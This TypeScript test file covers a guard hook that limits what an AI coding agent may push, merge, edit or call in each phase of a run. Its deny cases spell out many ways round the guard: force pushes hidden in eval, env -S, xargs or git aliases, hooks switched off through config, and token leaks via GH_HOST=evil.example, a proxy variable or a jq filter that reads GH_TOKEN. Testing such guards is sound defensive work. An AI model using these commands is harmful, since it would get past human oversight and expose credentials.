import { expect, test } from 'claude-code/testing'
import type { PhaseName } from '../types'
import { REASONS, forcedPush, guard, isJiraRead, isPushUrl, pushArgs, reasonKeyOf } from './guard'
import { PHASES } from './phases'

type Ctx = Parameters<typeof guard>[1]

const ctxFor = (phase: PhaseName, overrides: Partial<Ctx> = {}): Ctx => ({
  active: true,
  phase,
  id: 'ABC-1',
  lockedPaths: ['tests/test_ac1.py', 'src/acceptance/ac2.spec.ts'],
  root: '/repo',
  ...overrides,
})

const run = (command: string, phase: PhaseName = 'PR', overrides: Partial<Ctx> = {}) => guard({ tool: 'Bash', input: { command } }, ctxFor(phase, overrides))

const PHASE_TEXT = (phase: PhaseName) => `goal-and-do allows git push only in the PR phase. This is the ${phase} phase.`
const TARGET_TEXT = 'goal-and-do allows only git push [-u] origin sdd/<id> (or HEAD:sdd/<id>). Other targets, force, delete, mirror, all and tags are blocked.'
const PR_TEXT = 'goal-and-do blocks gh pr merge, gh pr ready and gh pr review. A person decides on the pull request.'
const API_TEXT = 'goal-and-do blocks gh api calls that write (a method or fields).'
const VERIFY_TEXT = "goal-and-do blocks --no-verify. The project's hooks run on every commit."
const GITHUB_TEXT = 'goal-and-do blocks GitHub MCP tools during a run. The PR phase uses git and gh.'
const PROD_TEXT = 'goal-and-do blocks production tools (mcp__dynatrace_prod__*) during a run.'
const CI_TEXT = 'goal-and-do blocks edits to CI files (.github/workflows/, Jenkinsfile*).'
const STATE_TEXT = 'goal-and-do blocks edits to its run state and the settings files.'
const INTENT_EDIT_TEXT = 'goal-and-do allows edits only in the change folder during the Intent phase.'
const INTENT_MCP_TEXT = 'goal-and-do allows only Jira reads during the Intent phase.'
const APPROVALS_TEXT = 'goal-and-do blocks edits to approvals.md. The mod writes it at each gate.'
const INTENT_SHELL_TEXT = 'goal-and-do allows only Git commands for the change folder during the Intent phase.'
const RUN_FILE_TEXT = 'goal-and-do blocks edits to run.json. The mod writes it.'
const INTENT_TOOL_TEXT = 'goal-and-do allows only reading, the change folder, Git and Jira reads during the Intent phase.'
const testsText = (path: string) => `goal-and-do blocks edits to the acceptance tests after Plan approval: ${path}.`
const UNPLACED_TEXT = 'goal-and-do blocks an edit whose path it cannot follow: a symbolic link on it leads nowhere or cannot be read.'
const STORE_TEXT = 'goal-and-do blocks edits to its store. The mod writes it.'
const GIT_CONFIG_TEXT =
  'goal-and-do blocks Git settings for hooks, fsmonitor, diff and filter drivers, includes, remotes, URLs, credentials and ssh during a run.'
const GIT_DIR_TEXT = "goal-and-do blocks edits to Git's own config, attributes and hooks during a run."

test('PR phase allows exactly the push of the change branch', () => {
  expect(run('git push origin sdd/ABC-1')).toEqual({ verdict: 'push' })
  expect(run('git push -u origin sdd/ABC-1')).toEqual({ verdict: 'push' })
  expect(run('git push --set-upstream origin sdd/ABC-1')).toEqual({ verdict: 'push' })
  expect(run('git push origin HEAD:sdd/ABC-1')).toEqual({ verdict: 'push' })
  expect(run('/usr/bin/git push origin sdd/ABC-1')).toEqual({ verdict: 'push' })
  expect(run('GIT_TERMINAL_PROMPT=0 git push origin sdd/ABC-1')).toEqual({ verdict: 'push' })
  expect(run("git 'push' origin 'sdd/ABC-1'")).toEqual({ verdict: 'push' })
})

// The push the mod lets through, rewritten

const UNSET =
  'command env -u GIT_SSH_COMMAND -u GIT_SSH -u GIT_CONFIG_GLOBAL -u GIT_CONFIG_COUNT -u GIT_CONFIG_PARAMETERS -u GIT_DIR -u GIT_WORK_TREE -u GIT_EXEC_PATH -u GIT_PROXY_COMMAND -u GIT_ASKPASS -u SSH_ASKPASS -u GIT_COMMON_DIR -u GIT_OBJECT_DIRECTORY -u GIT_ALTERNATE_OBJECT_DIRECTORIES -u GIT_INDEX_FILE -u GIT_NAMESPACE -u GIT_SSH_VARIANT -u GIT_TEMPLATE_DIR -u GIT_CONFIG -u GIT_SSL_NO_VERIFY -u GIT_TRACE -u GIT_TRACE_CURL -u GIT_TRACE_PACKET -u GIT_TRACE2 -u GIT_TRACE2_EVENT -u GIT_TRACE2_PERF -u GIT_CURL_VERBOSE'
const FORCED = `${UNSET} git -C '/repo' -c core.hooksPath=/dev/null -c core.sshCommand=ssh push --no-verify`
const DEMO = "'https://github.example.com/example/demo.git'"

test('the allowed push runs with forced settings to the recorded URL itself: no shell function, no GIT_ variables, the root, no hooks, plain ssh, the refspec as given', () => {
  const url = 'https://github.example.com/example/demo.git'
  const forced = (command: string) => {
    const args = pushArgs(command, 'ABC-1')
    return args === undefined ? undefined : forcedPush(args, url, '/repo')
  }
  expect(forced('git push origin sdd/ABC-1')).toBe(`${FORCED} ${DEMO} sdd/ABC-1`)
  expect(forced('git push -u origin sdd/ABC-1')).toBe(`${FORCED} -u ${DEMO} sdd/ABC-1`)
  expect(forced('git push origin HEAD:sdd/ABC-1')).toBe(`${FORCED} ${DEMO} HEAD:sdd/ABC-1`)
  expect(forced('git push -u origin HEAD:sdd/ABC-1')).toBe(`${FORCED} -u ${DEMO} HEAD:sdd/ABC-1`)
  expect(forced('git push --set-upstream origin sdd/ABC-1')).toBe(`${FORCED} --set-upstream ${DEMO} sdd/ABC-1`)
  expect(forced('  git  push\t-u   origin sdd/ABC-1 \n')).toBe(`${FORCED} -u ${DEMO} sdd/ABC-1`)
  expect(forced('git push origin sdd/ABC-1')).toBe(
    "command env -u GIT_SSH_COMMAND -u GIT_SSH -u GIT_CONFIG_GLOBAL -u GIT_CONFIG_COUNT -u GIT_CONFIG_PARAMETERS -u GIT_DIR -u GIT_WORK_TREE -u GIT_EXEC_PATH -u GIT_PROXY_COMMAND -u GIT_ASKPASS -u SSH_ASKPASS -u GIT_COMMON_DIR -u GIT_OBJECT_DIRECTORY -u GIT_ALTERNATE_OBJECT_DIRECTORIES -u GIT_INDEX_FILE -u GIT_NAMESPACE -u GIT_SSH_VARIANT -u GIT_TEMPLATE_DIR -u GIT_CONFIG -u GIT_SSL_NO_VERIFY -u GIT_TRACE -u GIT_TRACE_CURL -u GIT_TRACE_PACKET -u GIT_TRACE2 -u GIT_TRACE2_EVENT -u GIT_TRACE2_PERF -u GIT_CURL_VERBOSE git -C '/repo' -c core.hooksPath=/dev/null -c core.sshCommand=ssh push --no-verify 'https://github.example.com/example/demo.git' sdd/ABC-1"
  )
})

test('the push URL and the root are each one shell-quoted word', () => {
  expect(forcedPush({ ref: 'sdd/ABC-1' }, "/tmp/it's here.git", "/Users/me/it's repo")).toBe(
    `${UNSET} git -C '/Users/me/it'\\''s repo' -c core.hooksPath=/dev/null -c core.sshCommand=ssh push --no-verify '/tmp/it'\\''s here.git' sdd/ABC-1`
  )
  expect(forcedPush({ upstream: '-u', ref: 'sdd/ABC-1' }, 'git@github.com:a/$(id).git', '/r/$(id)')).toBe(
    `${UNSET} git -C '/r/$(id)' -c core.hooksPath=/dev/null -c core.sshCommand=ssh push --no-verify -u 'git@github.com:a/$(id).git' sdd/ABC-1`
  )
})

test('only the exact push shape, alone, is rewritten', () => {
  for (const command of [
    'GIT_TERMINAL_PROMPT=0 git push origin sdd/ABC-1',
    '/usr/bin/git push origin sdd/ABC-1',
    "git 'push' origin 'sdd/ABC-1'",
    'git push origin sdd/ABC-1; echo x',
    'git push origin sdd/ABC-1 && git log',
    'git push origin sdd/ABC-1 > out.txt',
    'git push origin sdd/ABC-1\ngit push origin main',
    'git push origin sdd/ABC-2',
    'git push origin sdd/ABC-12',
    'git push origin sdd/ABC-1 --force',
    'git push -f origin sdd/ABC-1',
    'git push -u -u origin sdd/ABC-1',
    'git push upstream sdd/ABC-1',
    'git push origin HEAD:main',
    'git -c a=b push origin sdd/ABC-1',
    'git push origin',
    '',
  ]) {
    expect(pushArgs(command, 'ABC-1'), command).toBeUndefined()
  }
})

test('a push URL must be a plain word: not empty, no control character, no leading dash', () => {
  for (const url of ['https://github.example.com/example/demo.git', 'git@github.com:a/b.git', '/tmp/remote.git', 'ssh://git@h/x']) {
    expect(isPushUrl(url), url).toBe(true)
  }
  for (const url of ['', '-oProxyCommand=x', '--upload-pack=x', 'https://h/x\n.git', 'https://h/\tx', 'a\u0000b', 'a\u007fb', 'a\rb', undefined, 42, null]) {
    expect(isPushUrl(url), JSON.stringify(url)).toBe(false)
  }
})

test('every phase denies a push to any other target or with any extra', () => {
  for (const command of [
    'git push origin HEAD:main',
    'git push origin sdd/ABC-1:main',
    'git push origin +sdd/ABC-1',
    'git push origin :main',
    'git push origin main',
    'git push origin sdd/ABC-2',
    'git push origin sdd/ABC-1 sdd/ABC-2',
    'git push origin sdd/ABC-1 extra',
    'git push',
    'git push origin',
    'git push --force',
    'git push -f origin sdd/ABC-1',
    'git push -uf origin sdd/ABC-1',
    'git push --force-with-lease',
    'git push --force-with-lease origin sdd/ABC-1',
    'git push --mirror',
    'git push --all',
    'git push --tags',
    'git push --delete origin sdd/ABC-1',
    'git push origin sdd/ABC-1 --force',
    'git push upstream sdd/ABC-1',
    'git push origin sdd/ABC-1 && git push other sdd/ABC-1',
    'git -c a=b push --force',
    'git -C . push origin sdd/ABC-1',
    'git -C ../other push origin sdd/ABC-1',
    'git --git-dir=../other/.git push origin sdd/ABC-1',
    'git --work-tree=../other push origin sdd/ABC-1',
    'git --no-pager push origin sdd/ABC-1',
    'cd x && git push origin main',
    'cd x && git push origin sdd/ABC-1',
    'git push origin sdd/ABC-1 && git status',
    'echo $(git push --force)',
    'echo "$(git push --force)"',
    'bash -c "git push --force"',
    "sh -lc 'git push origin sdd/ABC-1'",
    'for b in x; do git push --force origin main; done',
    'if true; then git push --force; fi',
    '{ git push --force origin main; }',
    '! git push --force origin main',
    'time git push --force origin main',
    '>/dev/null git push --force origin main',
    '2>&1 git push --force origin main',
    '> out.txt git push --force origin main',
    'exec git push --force origin main',
    'nice -n 5 git push --force origin main',
    'nice -5 git push --force origin main',
    'nohup git push --force origin main',
    'timeout 1.5 git push --force origin main',
    'timeout 10s git push --force origin main',
    'timeout -k 5 30 git push --force origin main',
    'echo main | xargs -I {} git push --force origin {}',
    'xargs -n 1 git push --force',
    'env -C . git push --force origin main',
    'env -i -u HOME git push --force origin main',
    'env -- git push --force origin main',
    'env FOO=1 nice time git push --force origin main',
    'git -c alias.p=push p --force origin main',
    'git -calias.p=push p',
    'git --config-env=alias.p=PUSHVAR p origin main',
    'git -c core.hooksPath=/dev/null commit -m x',
    'git -c Core.HooksPath=/dev/null commit -m x',
    'GIT_DIR=../other/.git git push origin sdd/ABC-1',
    'GIT_WORK_TREE=../other git push origin sdd/ABC-1',
    'env GIT_DIR=../other/.git git push origin sdd/ABC-1',
  ]) {
    for (const phase of PHASES) {
      const verdict = run(command, phase)
      expect(`${command} @ ${phase}: ${verdict.verdict}`).toBe(`${command} @ ${phase}: deny`)
    }
  }
})

test('the deny reason of a push names the phase outside PR and the target in PR', () => {
  expect(run('git push origin sdd/ABC-1', 'Intent')).toEqual({ verdict: 'deny', reason: PHASE_TEXT('Intent') })
  expect(run('git push origin sdd/ABC-1', 'Build')).toEqual({ verdict: 'deny', reason: PHASE_TEXT('Build') })
  expect(run('git push origin main', 'Spec')).toEqual({ verdict: 'deny', reason: PHASE_TEXT('Spec') })
  expect(run('git -C . push origin sdd/ABC-1', 'Test')).toEqual({ verdict: 'deny', reason: PHASE_TEXT('Test') })
  expect(run('git push origin HEAD:main')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  expect(run('git push --force')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  expect(run('git -C . push origin sdd/ABC-1')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  expect(run('git -c a=b push --force')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  expect(run('cd x && git push origin main')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
})

test('wrapped commands get the reason of the command inside', () => {
  expect(run('time git push --force origin main')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  expect(run('for b in x; do git push --force origin main; done', 'Build')).toEqual({ verdict: 'deny', reason: PHASE_TEXT('Build') })
  expect(run('git -c alias.p=push p --force origin main')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  expect(run('git -c core.hooksPath=/dev/null commit -m x', 'Build')).toEqual({ verdict: 'deny', reason: GIT_CONFIG_TEXT })
  expect(run('git -c core.hooksPath=/dev/null commit -m x', 'Intent')).toEqual({ verdict: 'deny', reason: VERIFY_TEXT })
  expect(run('GIT_DIR=../other/.git git push origin sdd/ABC-1')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  expect(run('GIT_DIR=../other/.git git push origin sdd/ABC-1', 'Test')).toEqual({ verdict: 'deny', reason: PHASE_TEXT('Test') })
  expect(run('exec gh pr merge 12', 'Build')).toEqual({ verdict: 'deny', reason: PR_TEXT })
  expect(run('time git commit --no-verify -m x', 'Build')).toEqual({ verdict: 'deny', reason: VERIFY_TEXT })
})

test('a wrapper around harmless commands, and a lone closing keyword, pass', () => {
  for (const command of [
    'time npm test',
    'nice -n 5 git status',
    'timeout 30 git log',
    'done',
    'fi',
    '}',
    'for b in x; do git status; done',
    'git status 2>&1',
  ]) {
    expect(run(command, 'Build')).toEqual({ verdict: 'pass' })
  }
})

test('gh pr merge, ready and review are denied', () => {
  for (const command of [
    'gh pr merge 12',
    'gh pr ready',
    'gh pr review --approve',
    'gh pr review 12 -a',
    'gh pr merge 12 --auto',
    'gh -R o/r pr merge 12',
    '/usr/local/bin/gh pr ready',
  ]) {
    for (const phase of PHASES) expect(run(command, phase)).toEqual({ verdict: 'deny', reason: PR_TEXT })
  }
})

test('gh api with a method or fields is denied, a plain read passes', () => {
  for (const command of [
    'gh api -X PUT repos/o/r/pulls/12/merge',
    'gh api -XPUT repos/o/r/pulls/12/merge',
    'gh api --method POST repos/o/r/issues',
    'gh api --method=POST repos/o/r/issues',
    'gh api -f x=y repos/o/r/issues',
    'gh api -F x=@file repos/o/r/issues',
    'gh api --field x=y repos/o/r/issues',
    'gh api --raw-field x=y repos/o/r/issues',
    'gh api --input body.json repos/o/r/issues',
  ]) {
    expect(run(command, 'Build')).toEqual({ verdict: 'deny', reason: API_TEXT })
  }
  expect(run('gh api /user', 'Build')).toEqual({ verdict: 'pass' })
  expect(run('gh api repos/o/r/pulls/12 --jq .state', 'Test')).toEqual({ verdict: 'pass' })
  // In the PR phase a write is refused too; its reads are in the test below.
  expect(run('gh api -X POST repos/o/r/issues', 'PR')).toEqual({ verdict: 'deny', reason: API_TEXT })
})

test('in the PR phase gh api passes as a GET of one relative endpoint with only --paginate, --jq and --include', () => {
  for (const command of [
    'gh api /user',
    'gh api user',
    'gh api repos/o/r/pulls',
    'gh api -X GET repos/o/r/pulls',
    'gh api -X get repos/o/r/pulls',
    'gh api --method GET repos/o/r/pulls',
    "gh api --method=GET repos/o/r/pulls/7 --paginate --jq '.[].number'",
    "gh api repos/o/r/pulls/7 -q '.state' -i",
    'gh api repos/o/r/pulls/7 --include',
    'gh api --jq=.state repos/o/r/pulls/7',
  ]) {
    expect(run(command, 'PR'), command).toEqual({ verdict: 'pass' })
  }
})

test('in the PR phase gh api with a write is denied as apiWrite and with another form as ghForm', () => {
  for (const command of [
    'gh api -X POST repos/o/r/issues',
    'gh api --method=DELETE repos/o/r/issues/1',
    'gh api -X',
    'gh api repos/o/r/issues -f title=x',
    'gh api repos/o/r/issues -F n=1',
    'gh api repos/o/r/issues --field n=1',
    'gh api repos/o/r/issues --raw-field n=1',
    'gh api --input body.json repos/o/r/issues',
    'gh api graphql -f query=x',
    'gh api -H "Accept: x" -f a=b repos/o/r/pulls',
  ]) {
    expect(run(command, 'PR'), command).toEqual({ verdict: 'deny', reason: API_TEXT })
  }
  for (const command of [
    'gh api',
    'gh api graphql',
    'gh api /graphql',
    'gh api https://git.example/api/v3/user',
    'gh api //git.example/user',
    'gh api --hostname git.example repos/o/r/pulls',
    "gh api -H 'Accept: x' repos/o/r/pulls",
    'gh api repos/o/r/pulls repos/o/r/issues',
    'gh api repos/o/r/pulls --cache 1h',
    'gh api repos/o/r/pulls --jq',
    'gh -R o/r api repos/o/r/pulls',
  ]) {
    const verdict = run(command, 'PR')
    expect(verdict.verdict, command).toBe('deny')
    expect(verdict.verdict === 'deny' ? reasonKeyOf(verdict.reason) : undefined, command).toBe('ghForm')
  }
})

test('in the PR phase gh auth status passes alone, and gh auth token, --show-token and other auth forms are denied', () => {
  expect(run('gh auth status', 'PR')).toEqual({ verdict: 'pass' })
  for (const command of ['gh auth status --show-token', 'gh auth status -t', 'gh auth token', 'gh auth login', 'gh auth status extra', 'gh auth refresh']) {
    expect(run(command, 'PR').verdict, command).toBe('deny')
  }
})

test('in the PR phase gh api refuses a jq filter that reads the environment, and gh refuses a GH_ or proxy variable', () => {
  for (const command of [
    "gh api repos/o/r/pulls --jq 'env'",
    'gh api repos/o/r/pulls -q $ENV.GH_TOKEN',
    "gh api repos/o/r/pulls --jq='env.HOME'",
    "gh api repos/o/r/pulls --jq 'input_filename'",
    'GH_HOST=evil.example gh api repos/o/r/pulls',
    'GH_ENTERPRISE_TOKEN=x gh auth status',
    'HTTPS_PROXY=http://evil.example gh api repos/o/r/pulls',
    'GITHUB_TOKEN=x gh api repos/o/r/pulls',
  ]) {
    expect(run(command, 'PR').verdict, command).toBe('deny')
  }
  expect(run("gh api repos/o/r/pulls --jq '.[].environment'", 'PR')).toEqual({ verdict: 'pass' })
  for (const command of ['export GH_HOST=evil.example', 'GH_HOST=evil.example']) expect(run(command, 'PR').verdict, command).toBe('deny')
})

test('outside the PR phase the gh api and gh auth rules are as before', () => {
  expect(run('gh api repos/o/r/pulls', 'Build')).toEqual({ verdict: 'pass' })
  expect(run('gh api -X GET repos/o/r/pulls', 'Build')).toEqual({ verdict: 'deny', reason: API_TEXT })
  expect(run('gh api -X POST repos/o/r/issues', 'Build')).toEqual({ verdict: 'deny', reason: API_TEXT })
  expect(run('gh auth status', 'Build')).toEqual({ verdict: 'pass' })
})

test('in the PR phase gh pr view passes by number, by URL and with -R, and not through xargs', () => {
  for (const command of ['gh pr view', 'gh pr view 7', 'gh pr view https://git.example/o/r/pull/9', 'gh pr view 7 -R o/r']) {
    expect(run(command, 'PR'), command).toEqual({ verdict: 'pass' })
  }
  expect(run('echo 7 | xargs gh pr view', 'PR').verdict).toBe('deny')
})

test('--no-verify is denied', () => {
  expect(run('git commit --no-verify -m x', 'Build')).toEqual({ verdict: 'deny', reason: VERIFY_TEXT })
  expect(run('git commit -m x --no-verify', 'PR')).toEqual({ verdict: 'deny', reason: VERIFY_TEXT })
  expect(run('git commit -n -m x', 'Build')).toEqual({ verdict: 'deny', reason: VERIFY_TEXT })
  expect(run('git commit -m "fix n"', 'Build')).toEqual({ verdict: 'pass' })
})

test('a MCP tool that merges is denied on any server', () => {
  const call = { tool: 'mcp__bitbucket__mergePullRequest', input: {} }
  expect(guard(call, ctxFor('Build'))).toEqual({ verdict: 'deny', reason: PR_TEXT })
})

test('every tool of a GitHub server is denied, reads included', () => {
  for (const tool of [
    'mcp__github__getIssue',
    'mcp__ghe__getPullRequest',
    'mcp__gh__list',
    'mcp__my-github__x',
    'mcp__corp_ghe_prod__getFile',
    'mcp__githubenterprise__x',
  ]) {
    expect(guard({ tool, input: {} }, ctxFor('PR'))).toEqual({ verdict: 'deny', reason: GITHUB_TEXT })
  }
})

test('a server that only contains the letters gh is not GitHub', () => {
  for (const tool of ['mcp__highspot__search', 'mcp__jira__getIssue', 'mcp__sigh__x']) {
    expect(guard({ tool, input: {} }, ctxFor('Build'))).toEqual({ verdict: 'pass' })
  }
})

test('production tools are denied', () => {
  expect(guard({ tool: 'mcp__dynatrace_prod__getProblems', input: {} }, ctxFor('Test'))).toEqual({ verdict: 'deny', reason: PROD_TEXT })
  expect(guard({ tool: 'mcp__dynatrace__getProblems', input: {} }, ctxFor('Test'))).toEqual({ verdict: 'pass' })
})

test('edits to a locked test path are denied', () => {
  for (const tool of ['Write', 'Edit', 'MultiEdit']) {
    expect(guard({ tool, input: { file_path: '/repo/tests/test_ac1.py' } }, ctxFor('Build'))).toEqual({
      verdict: 'deny',
      reason: testsText('tests/test_ac1.py'),
    })
  }
  expect(guard({ tool: 'NotebookEdit', input: { notebook_path: '/repo/src/acceptance/ac2.spec.ts' } }, ctxFor('Test'))).toEqual({
    verdict: 'deny',
    reason: testsText('src/acceptance/ac2.spec.ts'),
  })
  expect(guard({ tool: 'Edit', input: { file_path: 'tests/test_ac1.py' } }, ctxFor('Build')).verdict).toBe('deny')
  expect(guard({ tool: 'Edit', input: { file_path: '/repo/tests/../tests/test_ac1.py' } }, ctxFor('Build')).verdict).toBe('deny')
})

test('edits to other test files and look-alike paths pass', () => {
  for (const file_path of ['/repo/tests/test_other.py', '/repo/xtests/test_ac1.py', '/repo/tests/test_ac1.py.bak']) {
    expect(guard({ tool: 'Edit', input: { file_path } }, ctxFor('Build'))).toEqual({ verdict: 'pass' })
  }
  expect(guard({ tool: 'Edit', input: { file_path: '/repo/src/main.py' } }, ctxFor('Build'))).toEqual({ verdict: 'pass' })
  expect(guard({ tool: 'Edit', input: {} }, ctxFor('Build'))).toEqual({ verdict: 'pass' })
})

test('edits to CI files are denied', () => {
  for (const file_path of [
    '/repo/.github/workflows/ci.yml',
    '.github/workflows/ci.yml',
    '/repo/.github/foo/../workflows/ci.yml',
    '/repo/Jenkinsfile',
    '/repo/Jenkinsfile-FCP',
    '/repo/ci/Jenkinsfile.release',
  ]) {
    for (const tool of ['Write', 'Edit', 'MultiEdit']) {
      expect(guard({ tool, input: { file_path } }, ctxFor('PR'))).toEqual({ verdict: 'deny', reason: CI_TEXT })
    }
  }
  expect(guard({ tool: 'Edit', input: { file_path: '/repo/.github/CODEOWNERS' } }, ctxFor('PR'))).toEqual({ verdict: 'pass' })
  expect(guard({ tool: 'Edit', input: { file_path: '/repo/docs/notes-Jenkinsfile.md' } }, ctxFor('PR'))).toEqual({ verdict: 'pass' })
})

test('edits to the run state and the settings files are denied', () => {
  for (const file_path of [
    '/repo/changes/ABC-1/run.json',
    'changes/ABC-1/run.json',
    '/repo/.claude/settings.json',
    '/repo/.claude/settings.local.json',
    '.claude/settings.json',
  ]) {
    expect(guard({ tool: 'Write', input: { file_path } }, ctxFor('Spec'))).toEqual({ verdict: 'deny', reason: STATE_TEXT })
  }
  expect(guard({ tool: 'Write', input: { file_path: '/repo/changes/ABC-1/spec.md' } }, ctxFor('Spec'))).toEqual({ verdict: 'pass' })
})

test('reads and other commands pass', () => {
  expect(run('git status', 'Build')).toEqual({ verdict: 'pass' })
  expect(run('git log --oneline', 'Build')).toEqual({ verdict: 'pass' })
  expect(run('gh pr checks 12 --watch', 'PR')).toEqual({ verdict: 'pass' })
  expect(run('npm test && git diff', 'Build')).toEqual({ verdict: 'pass' })
  expect(guard({ tool: 'Read', input: { file_path: '/repo/tests/test_ac1.py' } }, ctxFor('Build'))).toEqual({ verdict: 'pass' })
  expect(guard({ tool: 'Bash', input: {} }, ctxFor('Build'))).toEqual({ verdict: 'pass' })
})

test('with no active run everything passes', () => {
  const idle = { active: false }
  expect(run('git push --force', 'Build', idle)).toEqual({ verdict: 'pass' })
  expect(run('gh pr merge 12', 'PR', idle)).toEqual({ verdict: 'pass' })
  expect(guard({ tool: 'mcp__ghe__getFile', input: {} }, ctxFor('PR', idle))).toEqual({ verdict: 'pass' })
  expect(guard({ tool: 'Write', input: { file_path: '/repo/tests/test_ac1.py' } }, ctxFor('Build', idle))).toEqual({ verdict: 'pass' })
})

test('GIT_CONFIG_* and the variables that run code deny any git command', () => {
  expect(run('GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.p GIT_CONFIG_VALUE_0=push git p --force origin main')).toEqual({ verdict: 'deny', reason: VERIFY_TEXT })
  expect(run('env GIT_CONFIG_COUNT=1 git commit -m x', 'Build')).toEqual({ verdict: 'deny', reason: VERIFY_TEXT })
  expect(run('GIT_CONFIG_GLOBAL=/tmp/x git status', 'Build')).toEqual({ verdict: 'deny', reason: VERIFY_TEXT })
  for (const name of ['GIT_SSH', 'GIT_SSH_COMMAND', 'GIT_EXEC_PATH', 'GIT_ASKPASS']) {
    expect(run(`${name}=x git status`, 'Build')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
    expect(run(`env ${name}=x git push origin sdd/ABC-1`)).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  }
})

test('any other GIT_ variable denies a push but not the harmless ones', () => {
  expect(run('GIT_SSH_COMMAND=x git push origin sdd/ABC-1')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  expect(run('GIT_TRACE=1 git push origin sdd/ABC-1')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  expect(run('env GIT_TRACE=1 git push origin sdd/ABC-1')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  expect(run('GIT_TRACE=1 git push origin sdd/ABC-1', 'Build')).toEqual({ verdict: 'deny', reason: PHASE_TEXT('Build') })
  expect(run('GIT_TRACE=1 git status', 'Build')).toEqual({ verdict: 'pass' })
  expect(run('GIT_TERMINAL_PROMPT=0 git push origin sdd/ABC-1')).toEqual({ verdict: 'push' })
  expect(run('FOO=1 GIT_TERMINAL_PROMPT=0 git push origin sdd/ABC-1')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
})

test('a push through a wrapper is denied, never pushed', () => {
  for (const command of [
    'echo main | xargs git push origin sdd/ABC-1',
    'timeout 60 git push origin sdd/ABC-1',
    'nice git push origin sdd/ABC-1',
    'nice -n 5 git push origin sdd/ABC-1',
    'exec git push origin sdd/ABC-1',
    'nohup git push origin sdd/ABC-1',
    'time git push origin sdd/ABC-1',
    'env FOO=1 git push origin sdd/ABC-1',
    'env -i git push origin sdd/ABC-1',
  ]) {
    expect(run(command)).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
    expect(run(command, 'Build')).toEqual({ verdict: 'deny', reason: PHASE_TEXT('Build') })
  }
})

test('env -S makes a command unparseable and is denied', () => {
  for (const command of [
    "env -S 'git push --force' x",
    "env --split-string 'git push --force' x",
    "env --split-string='git push --force'",
    "env -S'git push --force'",
    "env -iS 'git push --force'",
  ]) {
    expect(run(command, 'Build').verdict).toBe('deny')
  }
  expect(run("env -S 'git push --force' x")).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
})

test('eval is read as one script', () => {
  expect(run('eval "git push --force origin main"')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  expect(run('eval git push --force origin main')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  expect(run('eval git push origin sdd/ABC-1')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  expect(run('eval "git push origin main"', 'Build')).toEqual({ verdict: 'deny', reason: PHASE_TEXT('Build') })
  expect(run('eval "gh pr merge 12"', 'Build')).toEqual({ verdict: 'deny', reason: PR_TEXT })
  expect(run('eval "git commit --no-verify -m x"', 'Build')).toEqual({ verdict: 'deny', reason: VERIFY_TEXT })
  expect(run('eval "npm test"', 'Build')).toEqual({ verdict: 'pass' })
  expect(run('eval', 'Build')).toEqual({ verdict: 'pass' })
})

test('path checks ignore case', () => {
  expect(guard({ tool: 'Write', input: { file_path: '/repo/Tests/Test_AC1.py' } }, ctxFor('Build'))).toEqual({
    verdict: 'deny',
    reason: testsText('tests/test_ac1.py'),
  })
  for (const file_path of ['/repo/.Claude/settings.json', '/repo/.claude/Settings.Local.json', '/repo/Changes/ABC-1/RUN.JSON']) {
    expect(guard({ tool: 'Write', input: { file_path } }, ctxFor('Spec'))).toEqual({ verdict: 'deny', reason: STATE_TEXT })
  }
  for (const file_path of ['/repo/.GitHub/Workflows/ci.yml', '/repo/JENKINSFILE', '/repo/jenkinsfile-fcp']) {
    expect(guard({ tool: 'Write', input: { file_path } }, ctxFor('PR'))).toEqual({ verdict: 'deny', reason: CI_TEXT })
  }
})

test('a locked folder locks every file under it and nothing beside it', () => {
  const folder = { lockedPaths: ['tests/acceptance'] }
  for (const file_path of [
    '/repo/tests/acceptance/test_x.py',
    '/repo/tests/acceptance/deep/er/test_x.py',
    'tests/acceptance/test_x.py',
    '/repo/Tests/Acceptance/test_x.py',
  ]) {
    expect(guard({ tool: 'Write', input: { file_path } }, ctxFor('Build', folder))).toEqual({
      verdict: 'deny',
      reason: testsText('tests/acceptance'),
    })
  }
  for (const file_path of ['/repo/tests/acceptance_old.py', '/repo/tests/other/test_x.py', '/repo/xtests/acceptance/test_x.py']) {
    expect(guard({ tool: 'Write', input: { file_path } }, ctxFor('Build', folder))).toEqual({ verdict: 'pass' })
  }
  const slash = { lockedPaths: ['tests/acceptance/'] }
  expect(guard({ tool: 'Write', input: { file_path: '/repo/tests/acceptance/test_x.py' } }, ctxFor('Build', slash)).verdict).toBe('deny')
  expect(guard({ tool: 'Write', input: { file_path: '/repo/src/main.py' } }, ctxFor('Build', { lockedPaths: [''] }))).toEqual({ verdict: 'pass' })
})

test('GIT_ variables that run a program deny any git command', () => {
  for (const name of ['GIT_PAGER', 'GIT_EXTERNAL_DIFF', 'GIT_PROXY_COMMAND', 'GIT_EDITOR', 'GIT_SEQUENCE_EDITOR']) {
    expect(run(`${name}=x git status`, 'Build')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
    expect(run(`env ${name}=x git log`, 'Build')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  }
  expect(run("GIT_PAGER='git push --force' git log", 'Build')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  expect(run('GIT_EXTERNAL_DIFF=x git diff', 'Build')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  expect(run('GIT_EDITOR=x git commit', 'Build')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  expect(run('GIT_PAGER=cat git push origin sdd/ABC-1')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
